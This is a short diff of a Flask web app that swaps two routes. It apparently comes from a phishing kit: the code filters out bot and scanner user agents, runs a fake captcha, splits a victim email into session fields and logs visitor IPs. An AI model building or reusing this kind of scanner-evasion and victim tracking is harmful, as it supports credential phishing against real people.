@@ -20,7 +20,7 @@ bot_user_agents = [
     'Feedly', 'bot', 'curl', "spider", "crawler"
 ]
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/first', methods=['GET', 'POST'])
 def captcha():
     if request.method == 'GET':
         # Set 'passed_captcha' to True without any user input check
@@ -49,7 +49,7 @@ def route2():
         session['ins'] = web_param[web_param.index('@') + 1:]
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
-@app.route("/first", methods=['POST'])
+@app.route("/", methods=['POST'])
 def first():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or request.headers.get('X-Client-IP') or request.remote_addr
